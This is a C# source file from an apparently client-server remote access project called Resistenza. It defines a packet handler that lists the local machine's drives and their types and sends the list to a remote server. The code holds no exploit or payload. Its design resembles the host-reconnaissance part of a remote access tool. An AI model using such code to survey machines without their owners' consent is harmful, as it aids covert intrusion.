using Resistenza.Common.Networking;
using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

namespace Resistenza.Common.Packets
{
    public class MountedPartitionsRequest : IPacket
    {
        public string Type {  get; set; }
        public MountedPartitionsRequest() {
            Type = this.GetType().ToString();
        }
        public async Task HandleAsync(SecureStream ServerStream)
        {
            var Response = new MountedPartitionsResponse();
            DriveInfo[] AllDrives = DriveInfo.GetDrives();
            foreach (DriveInfo d in AllDrives)
            {
                DriveInformation dInfo = new DriveInformation();
                dInfo.RootDirectory = d.RootDirectory.Name;
                dInfo.DriveType = d.DriveType;
                Response.RootAndType.Add(dInfo);
            }
            
            await ServerStream.SendPacketAsync(Response);
            ;

        }


    }
}
